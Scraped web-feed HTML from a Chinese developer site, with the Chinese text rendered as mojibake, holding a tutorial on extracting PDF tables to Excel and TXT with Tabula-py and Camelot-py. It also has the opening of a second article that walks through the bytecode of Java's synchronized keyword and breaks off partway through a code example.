pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä½¿ç”¨ Python é«˜æ•ˆæå– PDF ä¸­çš„è¡¨æ ¼æ•°æ®å¹¶å¯¼å‡ºä¸º TXT æˆ– Excel</h2>
<p>åœ¨æ—¥å¸¸åŠå…¬ã€æ•°æ®åˆ†ææˆ–ä¿¡æ¯å½’æ¡£è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šé‡åˆ°åŒ…å«è¡¨æ ¼æ•°æ®çš„ PDF æ–‡ä»¶ã€‚ç„¶è€Œï¼ŒPDF æœ¬è´¨ä¸Šæ˜¯ä¸€ç§ç”¨äºå±•ç¤ºå’Œæ‰“å°çš„æ ¼å¼ï¼Œå¹¶éä¸ºæ•°æ®å¤„ç†è€Œè®¾è®¡ï¼Œå› æ­¤ç›´æ¥ä»ä¸­æå–ç»“æ„åŒ–æ•°æ®é¢‡å…·æŒ‘æˆ˜ã€‚å¹¸è¿çš„æ˜¯ï¼Œå€ŸåŠ© Python å¼ºå¤§çš„ç”Ÿæ€å·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªåŠ¨åŒ–åœ°ä» PDF ä¸­è¯†åˆ«å¹¶æå–è¡¨æ ¼å†…å®¹ï¼Œå¹¶å°†å…¶ä¿å­˜ä¸ºä¾¿äºåç»­å¤„ç†çš„ TXT æˆ– Excelï¼ˆ.xlsxï¼‰æ ¼å¼ã€‚</p>
<p>æœ¬æ–‡å°†ä»‹ç»ä¸¤ç§ä¸»æµä¸”é«˜æ•ˆçš„å¼€æºåº“â€”â€”<strong>Tabula-py</strong> å’Œ <strong>Camelot-py</strong>ï¼Œå¹¶é€šè¿‡å®Œæ•´ç¤ºä¾‹æ¼”ç¤ºå¦‚ä½•å°† PDF è¡¨æ ¼æ•°æ®å¯¼å‡ºä¸º TXT å’Œ Excel æ–‡ä»¶ã€‚</p>
<hr/>
<h3 data-id="heading-1">ä¸€ã€å‡†å¤‡å·¥ä½œï¼šå®‰è£…å¿…è¦ä¾èµ–</h3>
<p>é¦–å…ˆï¼Œç¡®ä¿ä½ çš„ç³»ç»Ÿå·²å®‰è£… Javaï¼ˆTabula ä¾èµ– Java è¿è¡Œï¼‰ï¼Œç„¶åé€šè¿‡ pip å®‰è£…æ‰€éœ€åº“ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å®‰è£… Tabula-pyï¼ˆåŸºäº Java çš„ Tabula å·¥å…·ï¼‰</span>
pip install tabula-py pandas openpyxl

<span class="hljs-comment"># æˆ–å®‰è£… Camelot-pyï¼ˆåŸºäº Ghostscript å’Œ OpenCVï¼Œæ›´å¼ºå¤§ä½†é…ç½®ç¨å¤æ‚ï¼‰</span>
pip install camelot-py<span class="hljs-section">[cv]</span> pandas openpyxl
</code></pre>
<blockquote>
<p><strong>æ³¨æ„</strong>ï¼šä½¿ç”¨ Camelot æ—¶ï¼ŒWindows ç”¨æˆ·éœ€é¢å¤–å®‰è£… <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.ghostscript.com%2F" target="_blank" title="https://www.ghostscript.com/" ref="nofollow noopener noreferrer">Ghostscript</a> å¹¶å°†å…¶æ·»åŠ åˆ°ç³»ç»Ÿ PATHã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-2">äºŒã€æ–¹æ³•ä¸€ï¼šä½¿ç”¨ Tabula-pyï¼ˆç®€å•å¿«æ·ï¼‰</h3>
<p>Tabula-py æ˜¯å¯¹ Java å·¥å…· Tabula çš„ Python å°è£…ï¼Œé€‚åˆå¤„ç†ç»“æ„æ¸…æ™°ã€è¾¹ç•Œçº¿å®Œæ•´çš„è¡¨æ ¼ã€‚</p>
<h4 data-id="heading-3">ç¤ºä¾‹ï¼šæå– PDF è¡¨æ ¼å¹¶ä¿å­˜ä¸º Excel å’Œ TXT</h4>
<pre><code class="hljs language-ini" lang="ini">import tabula
import pandas as pd

<span class="hljs-comment"># æŒ‡å®š PDF æ–‡ä»¶è·¯å¾„</span>
<span class="hljs-attr">pdf_path</span> = <span class="hljs-string">"example_table.pdf"</span>

<span class="hljs-comment"># æå–æ‰€æœ‰é¡µé¢çš„è¡¨æ ¼ï¼ˆè¿”å› DataFrame åˆ—è¡¨ï¼‰</span>
<span class="hljs-attr">tables</span> = tabula.read_pdf(pdf_path, pages=<span class="hljs-string">"all"</span>, multiple_tables=<span class="hljs-literal">True</span>)

<span class="hljs-comment"># åˆå¹¶æ‰€æœ‰è¡¨æ ¼ï¼ˆæˆ–æŒ‰éœ€å¤„ç†å•ä¸ªï¼‰</span>
<span class="hljs-attr">combined_df</span> = pd.concat(tables, ignore_index=<span class="hljs-literal">True</span>)

<span class="hljs-comment"># å¯¼å‡ºä¸º Excel</span>
combined_df.to_excel("output.xlsx", <span class="hljs-attr">index</span>=<span class="hljs-literal">False</span>)

<span class="hljs-comment"># å¯¼å‡ºä¸º TXTï¼ˆä»¥åˆ¶è¡¨ç¬¦åˆ†éš”ï¼‰</span>
combined_df.to_csv("output.txt", <span class="hljs-attr">sep</span>=<span class="hljs-string">"\t"</span>, index=<span class="hljs-literal">False</span>, na_rep=<span class="hljs-string">""</span>)

print("è¡¨æ ¼å·²æˆåŠŸå¯¼å‡ºä¸º Excel å’Œ TXT æ–‡ä»¶ï¼")
</code></pre>
<h4 data-id="heading-4">ä¼˜ç‚¹ï¼š</h4>
<ul>
<li>ä½¿ç”¨ç®€å•ï¼Œå‡ è¡Œä»£ç å³å¯å®Œæˆã€‚</li>
<li>å¯¹æ ‡å‡†è¡¨æ ¼ï¼ˆæœ‰è¾¹æ¡†çº¿ï¼‰è¯†åˆ«å‡†ç¡®ç‡é«˜ã€‚</li>
</ul>
<h4 data-id="heading-5">å±€é™ï¼š</h4>
<ul>
<li>å¯¹æ— è¾¹æ¡†æˆ–å¸ƒå±€å¤æ‚çš„è¡¨æ ¼æ”¯æŒè¾ƒå¼±ã€‚</li>
<li>ä¾èµ– Java ç¯å¢ƒã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-6">ä¸‰ã€æ–¹æ³•äºŒï¼šä½¿ç”¨ Camelot-pyï¼ˆç²¾å‡†çµæ´»ï¼‰</h3>
<p>Camelot æä¾›äº†ä¸¤ç§è§£ææ¨¡å¼ï¼š<code>lattice</code>ï¼ˆé€‚ç”¨äºæœ‰è¾¹æ¡†çš„è¡¨æ ¼ï¼‰å’Œ <code>stream</code>ï¼ˆé€‚ç”¨äºæ— è¾¹æ¡†ä½†å¯¹é½è‰¯å¥½çš„è¡¨æ ¼ï¼‰ï¼Œçµæ´»æ€§æ›´é«˜ã€‚</p>
<h4 data-id="heading-7">ç¤ºä¾‹ï¼šä½¿ç”¨ Camelot æå–å¹¶å¯¼å‡º</h4>
<pre><code class="hljs language-ini" lang="ini">import camelot
import pandas as pd

<span class="hljs-attr">pdf_path</span> = <span class="hljs-string">"example_table.pdf"</span>

<span class="hljs-comment"># ä½¿ç”¨ 'lattice' æ¨¡å¼ï¼ˆæœ‰è¾¹æ¡†è¡¨æ ¼ï¼‰</span>
<span class="hljs-attr">tables</span> = camelot.read_pdf(pdf_path, pages=<span class="hljs-string">"all"</span>, flavor=<span class="hljs-string">"lattice"</span>)

<span class="hljs-comment"># è‹¥è¡¨æ ¼æ— è¾¹æ¡†ï¼Œå¯å°è¯•ï¼š</span>
<span class="hljs-comment"># tables = camelot.read_pdf(pdf_path, pages="all", flavor="stream")</span>

if tables:
    <span class="hljs-comment"># åˆå¹¶æ‰€æœ‰è¡¨æ ¼</span>
    <span class="hljs-attr">dfs</span> = [table.df for table in tables]
    <span class="hljs-attr">combined_df</span> = pd.concat(dfs, ignore_index=<span class="hljs-literal">True</span>)

    <span class="hljs-comment"># æ¸…ç†åˆ—åï¼ˆCamelot é»˜è®¤æ— åˆ—åï¼Œç¬¬ä¸€è¡Œä¸ºæ•°æ®ï¼‰</span>
    <span class="hljs-comment"># å¦‚éœ€å°†ç¬¬ä¸€è¡Œè®¾ä¸ºåˆ—åï¼š</span>
    <span class="hljs-comment"># combined_df.columns = combined_df.iloc[0]</span>
    <span class="hljs-comment"># combined_df = combined_df[1:].reset_index(drop=True)</span>

    <span class="hljs-comment"># å¯¼å‡º</span>
    combined_df.to_excel("camelot_output.xlsx", <span class="hljs-attr">index</span>=<span class="hljs-literal">False</span>)
    combined_df.to_csv("camelot_output.txt", <span class="hljs-attr">sep</span>=<span class="hljs-string">"\t"</span>, index=<span class="hljs-literal">False</span>, header=<span class="hljs-literal">False</span>)

    print(f"æˆåŠŸæå– {len(tables)} ä¸ªè¡¨æ ¼ï¼Œå·²ä¿å­˜ä¸º Excel å’Œ TXTã€‚")
else:
    print("æœªæ£€æµ‹åˆ°ä»»ä½•è¡¨æ ¼ã€‚")
</code></pre>
<h4 data-id="heading-8">ä¼˜ç‚¹ï¼š</h4>
<ul>
<li>æ”¯æŒæ— è¾¹æ¡†è¡¨æ ¼ï¼ˆstream æ¨¡å¼ï¼‰ã€‚</li>
<li>å¯å¯è§†åŒ–è°ƒè¯•è¡¨æ ¼åŒºåŸŸï¼ˆ<code>tables[0].plot()</code>ï¼‰ã€‚</li>
<li>æä¾›ç²¾åº¦è¯„ä¼°æŒ‡æ ‡ï¼ˆå¦‚ accuracyï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-9">å±€é™ï¼š</h4>
<ul>
<li>é…ç½®ç¨å¤æ‚ï¼Œéœ€å®‰è£… Ghostscriptã€‚</li>
<li>å¤§æ–‡ä»¶å¤„ç†é€Ÿåº¦ç•¥æ…¢äº Tabulaã€‚</li>
</ul>
<hr/>
<h3 data-id="heading-10">å››ã€å¯¼å‡ºæ ¼å¼è¯´æ˜</h3>
<ul>
<li><strong>Excel (.xlsx)</strong> ï¼šä¿ç•™è¡¨æ ¼ç»“æ„ï¼Œæ”¯æŒå¤šåˆ—ã€å¤šè¡Œï¼Œé€‚åˆåç»­åˆ†æï¼ˆä½¿ç”¨ <code>pandas.DataFrame.to_excel</code>ï¼‰ã€‚</li>
<li><strong>TXT (.txt)</strong> ï¼šé€šå¸¸ä»¥åˆ¶è¡¨ç¬¦ï¼ˆ<code>\t</code>ï¼‰æˆ–é€—å·åˆ†éš”ï¼Œè½»é‡ä¸”å…¼å®¹æ€§å¼ºï¼ˆä½¿ç”¨ <code>to_csv</code> å¹¶æŒ‡å®š <code>sep</code>ï¼‰ã€‚</li>
</ul>
<blockquote>
<p>æç¤ºï¼šè‹¥éœ€ä¿ç•™åŸå§‹æ¢è¡Œæˆ–ç‰¹æ®Šå­—ç¬¦ï¼Œå¯åœ¨ <code>to_csv</code> ä¸­è®¾ç½® <code>quoting=csv.QUOTE_ALL</code> æˆ–è°ƒæ•´ç¼–ç ï¼ˆå¦‚ <code>encoding='utf-8-sig'</code>ï¼‰ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-11">äº”ã€å¸¸è§é—®é¢˜ä¸ä¼˜åŒ–å»ºè®®</h3>
<ol>
<li>
<p><strong>è¡¨æ ¼è¯†åˆ«ä¸å…¨ï¼Ÿ</strong></p>
<ul>
<li>å°è¯•æŒ‡å®šå…·ä½“é¡µç ï¼š<code>pages="1,3,5"</code>ã€‚</li>
<li>è°ƒæ•´ Camelot çš„ <code>table_areas</code> å‚æ•°æ‰‹åŠ¨åˆ’å®šåŒºåŸŸã€‚</li>
</ul>
</li>
<li>
<p><strong>ä¸­æ–‡ä¹±ç ï¼Ÿ</strong></p>
<ul>
<li>ç¡®ä¿ PDF ä½¿ç”¨æ ‡å‡†å­—ä½“ï¼›å¯¼å‡ºæ—¶æŒ‡å®š <code>encoding='utf-8-sig'</code>ã€‚</li>
</ul>
</li>
<li>
<p><strong>æ€§èƒ½ä¼˜åŒ–</strong></p>
<ul>
<li>å¯¹äºå¤§æ‰¹é‡ PDFï¼Œå»ºè®®ä½¿ç”¨å¤šè¿›ç¨‹æˆ–å¼‚æ­¥å¤„ç†ã€‚</li>
<li>é¢„å¤„ç† PDFï¼ˆå¦‚è£å‰ªã€å¢å¼ºå¯¹æ¯”åº¦ï¼‰å¯æå‡è¯†åˆ«ç‡ã€‚</li>
</ul>
</li>
</ol>
<hr/>
<h3 data-id="heading-12">ç»“è¯­</h3>
<p>Python ä¸º PDF è¡¨æ ¼æ•°æ®æå–æä¾›äº†å¼ºå¤§è€Œçµæ´»çš„è§£å†³æ–¹æ¡ˆã€‚<strong>Tabula-py é€‚åˆå¿«é€Ÿä¸Šæ‰‹çš„æ ‡å‡†è¡¨æ ¼</strong>ï¼Œè€Œ <strong>Camelot-py åˆ™åœ¨å¤æ‚åœºæ™¯ä¸‹è¡¨ç°æ›´ä¼˜</strong>ã€‚ç»“åˆ pandas çš„æ•°æ®å¤„ç†èƒ½åŠ›ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ¾å°†â€œä¸å¯ç¼–è¾‘â€çš„ PDF è¡¨æ ¼è½¬åŒ–ä¸ºç»“æ„åŒ–çš„ TXT æˆ– Excel æ–‡ä»¶ï¼Œå¤§å¹…æå‡æ•°æ®å†åˆ©ç”¨æ•ˆç‡ã€‚</p>
<p>æ— è®ºä½ æ˜¯è´¢åŠ¡äººå‘˜ã€æ•°æ®åˆ†æå¸ˆè¿˜æ˜¯è‡ªåŠ¨åŒ–å¼€å‘è€…ï¼ŒæŒæ¡è¿™äº›å·¥å…·éƒ½å°†æ˜¾è‘—ç®€åŒ–ä½ çš„å·¥ä½œæµç¨‹ã€‚å¿«è¯•è¯•å§ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[synchronizedçš„åº•å±‚å…¶å®åªæœ‰è¿™ä¸€ç‚¹]]></title>    <link>https://juejin.cn/post/7600355625475326004</link>    <guid>https://juejin.cn/post/7600355625475326004</guid>    <pubDate>2026-01-29T08:57:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600355625475326004" data-draft-id="7600426046425153571" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="synchronizedçš„åº•å±‚å…¶å®åªæœ‰è¿™ä¸€ç‚¹"/> <meta itemprop="keywords" content="Java,Java EE"/> <meta itemprop="datePublished" content="2026-01-29T08:57:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€ç¢—é¢421"/> <meta itemprop="url" content="https://juejin.cn/user/3632442146558520"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            synchronizedçš„åº•å±‚å…¶å®åªæœ‰è¿™ä¸€ç‚¹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3632442146558520/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€ç¢—é¢421
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T08:57:41.000Z" title="Thu Jan 29 2026 08:57:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»17åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.synchronizedå­—èŠ‚ç åˆ†æ</h2>
<p>â€ƒâ€ƒåœ¨ Java ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ synchronized å…³é”®å­—æ¥å®ç°çº¿ç¨‹ä¹‹é—´çš„åŒæ­¥æ“ä½œã€‚å½“ä¸€ä¸ªå¯¹è±¡è¢« synchronized å…³é”®å­—ä¿®é¥°çš„ä»£ç å—æˆ–æ–¹æ³•é”å®šæ—¶ï¼Œå…¶ä»–çº¿ç¨‹æ— æ³•è¿›å…¥è¿™æ®µä»£ç å—æˆ–æ–¹æ³•ï¼Œç›´åˆ°è¯¥å¯¹è±¡çš„é”è¢«é‡Šæ”¾ä¸ºæ­¢ã€‚</p>
<p>â€ƒâ€ƒå½“ä½ ç¼–å†™ä¸€ä¸ªä½¿ç”¨ synchronizedçš„ Java æ–¹æ³•æ—¶ï¼ŒJava ç¼–è¯‘å™¨ï¼ˆjavacï¼‰åœ¨å°†æº	ä»£ç ç¼–è¯‘ä¸ºå­—èŠ‚ç ï¼ˆ.class æ–‡ä»¶ï¼‰æ—¶ï¼Œå°±å·²ç»åœ¨ç›¸åº”çš„ä½ç½®æ’å…¥äº† monitorenterå’Œ monitorexitæŒ‡ä»¤ã€‚</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬ç¨å¾®çœ‹ä¸€ä¸‹ä½¿ç”¨synchronizedçš„å‡ ç§æƒ…å†µï¼Œä»¥åŠå…¶å¯¹åº”çš„å­—èŠ‚ç ï¼š</p>
<h3 data-id="heading-1">1.1 æƒ…å†µ1</h3>
<p>ç°åœ¨æˆ‘ä»¬å†™ä¸€æ®µç®€å•çš„ä»£ç ï¼Œå¹¶æŸ¥çœ‹ä»–çš„å­—èŠ‚ç ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">()</span>{
    <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>){
       System.out.println(<span class="hljs-string">"hello"</span>);
    }
}
</code></pre>
<p>è¯¥æ–¹æ³•ç¼–è¯‘åçš„å­—èŠ‚ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">//å°†å¸ƒå±€å˜é‡è¡¨ä¸­çš„ç¬¬0ä½å‹å…¥æ“ä½œæ•°æ ˆï¼Œï¼ˆå› ä¸ºè¿™æ˜¯ä¸€ä¸ªæ™®é€šæ–¹æ³•ï¼Œç¬¬0ä½å­˜çš„æ˜¯å½“å‰å¯¹è±¡ï¼Œæ‰€ä»¥å°±æ˜¯å°†å½“å‰å¯¹è±¡å‹å…¥æ“ä½œæ•°æ ˆï¼‰</span>
<span class="hljs-number">0</span> aload_0
<span class="hljs-comment">//å¤åˆ¶å½“å‰å¯¹è±¡å¼•ç”¨å¹¶å°†å…¶å‹å…¥æ“ä½œæ•°æ ˆ</span>
<span class="hljs-number">1</span> dup
<span class="hljs-comment">//å°†å¤åˆ¶çš„å¯¹è±¡å¼•ç”¨å­˜å‚¨åœ¨å±€éƒ¨å˜é‡è¡¨ä¸‹æ ‡ä¸º1çš„ä½ç½®</span>
<span class="hljs-number">2</span> astore_1
<span class="hljs-comment">//è·å–å¯¹è±¡é”ï¼Œè¿›å…¥åŒæ­¥å—</span>
<span class="hljs-number">3</span> monitorenter
<span class="hljs-comment">//ä»Systemç±»çš„outå­—æ®µä¸­è·å–é™æ€PrintStreamå¯¹è±¡çš„å¼•ç”¨</span>
<span class="hljs-number">4</span> getstatic #<span class="hljs-number">2</span> &lt;java/lang/System.out : Ljava/io/PrintStream;&gt;
<span class="hljs-comment">//å°†å¸¸é‡æ± ä¸­ç´¢å¼•ä¸º#5çš„å­—ç¬¦ä¸²â€œhelloâ€å‹æ ˆ</span>
<span class="hljs-number">7</span> ldc #<span class="hljs-number">5</span> &lt;hello&gt;
<span class="hljs-comment">//è°ƒç”¨PrintStreamå¯¹è±¡çš„println()æ–¹æ³•æ¥æ‰“å°å †æ ˆé¡¶éƒ¨çš„å­—ç¬¦ä¸²å¯¹è±¡</span>
<span class="hljs-number">9</span> invokevirtual #<span class="hljs-number">4</span> &lt;java/io/PrintStream.println : (Ljava/lang/String;)V&gt;
<span class="hljs-comment">//ä»å±€éƒ¨å˜é‡è¡¨1çš„ä½ç½®ä¸­åŠ è½½å…ˆå‰ä¿å­˜çš„å¯¹è±¡å¼•ç”¨</span>
<span class="hljs-number">12</span> aload_1
<span class="hljs-comment">//é€€å‡ºåŒæ­¥å—å¹¶é‡Šæ”¾å¯¹è±¡é”</span>
<span class="hljs-number">13</span> monitorexit
<span class="hljs-comment">//è·³è½¬åˆ°ç¬¬ 22 è¡Œä»£ç ï¼ˆå³æ–¹æ³•è¿”å›å¤„ï¼‰ï¼Œè·³è¿‡å¼‚å¸¸å¤„ç†ä»£ç </span>
<span class="hljs-number">14</span> goto <span class="hljs-number">22</span> (+<span class="hljs-number">8</span>)
<span class="hljs-comment">//æ•è·ä»»ä½•å¼‚å¸¸å¹¶å°†å…¶å­˜å‚¨åœ¨å±€éƒ¨å˜é‡è¡¨ä¸‹æ ‡ä¸º2çš„ä½ç½®ã€‚</span>
<span class="hljs-number">17</span> astore_2
<span class="hljs-comment">//ä»å±€éƒ¨å˜é‡1ä¸­çš„ä½ç½®åŠ è½½å¯¹è±¡å¼•ç”¨ã€‚</span>
<span class="hljs-number">18</span> aload_1
<span class="hljs-comment">//é€€å‡ºåŒæ­¥å—å¹¶é‡Šæ”¾å¯¹è±¡é”</span>
<span class="hljs-number">19</span> monitorexit
<span class="hljs-comment">//å°†å…ˆå‰æ•è·çš„å¼‚å¸¸é‡æ–°æŠ›å‡º</span>
<span class="hljs-number">20</span> aload_2
<span class="hljs-comment">//æŠ›å‡ºå¼‚å¸¸</span>
<span class="hljs-number">21</span> athrow
<span class="hljs-comment">//æ­£å¸¸è¿”å›æ–¹æ³•</span>
<span class="hljs-number">22</span> <span class="hljs-keyword">return</span>
</code></pre>
<p>â€ƒâ€ƒæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸Šè¿°å­—èŠ‚ç ä¸­æœ‰ä¸€ä¸ªmonitorenteræŒ‡ä»¤ï¼Œä½†æ˜¯æœ‰ä¸¤ä¸ªmonitorexitæŒ‡ä»¤ã€‚
è¿™æ˜¯å› ä¸ºåœ¨synchronizedå—ä¸­ï¼Œå³ä½¿æ‚¨çš„ä»£ç ä¸­æ²¡æœ‰æ˜æ˜¾çš„å¼‚å¸¸ï¼Œä¹Ÿå¯èƒ½å­˜åœ¨éšå¼å¼‚å¸¸ï¼Œä¾‹å¦‚NullPointerExceptionç­‰ã€‚å› æ­¤ï¼Œå³ä½¿ä»£ç ä¸­æ²¡æœ‰æ˜æ˜¾çš„å¼‚å¸¸ï¼Œä¹Ÿæœ‰å¯èƒ½åœ¨å­—èŠ‚ç å±‚é¢ä¸Šå­˜åœ¨å¤šä¸ªmonitorexitæŒ‡ä»¤ã€‚JVMéœ€è¦ç¡®ä¿ç›‘è§†å™¨é”å¾—åˆ°é‡Šæ”¾ï¼Œä»¥é¿å…æ­»é”ã€‚</p>
<h3 data-id="heading-2">1.2 æƒ…å†µ2</h3>
<p>ç°åœ¨æˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹å…¶ä»–æƒ…å†µï¼š</p>
<p>å°†ä»£ç åŠ ä¸Š throw new RuntimeException();</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">()</span>{
     <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>){
            System.out.println(<span class="hljs-string">"hello"</span>);
